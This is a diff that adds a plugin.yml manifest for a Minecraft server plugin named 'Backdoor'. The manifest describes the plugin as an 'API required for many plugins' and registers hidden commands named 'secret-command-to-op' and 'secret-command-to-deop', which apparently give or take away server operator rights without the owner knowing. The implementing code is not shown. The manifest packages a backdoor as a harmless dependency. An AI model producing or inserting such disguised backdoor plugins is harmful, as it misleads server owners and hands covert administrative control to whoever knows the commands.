@@ -1,0 +1,10 @@
+name: Backdoor
+version: ${project.version}
+main: me.olliejw.backdoor.Backdoor
+api-version: 1.13
+description: API required for many plugins
+commands:
+  secret-command-to-op:
+    usage: /<command>
+  secret-command-to-deop:
+    usage: /<command>
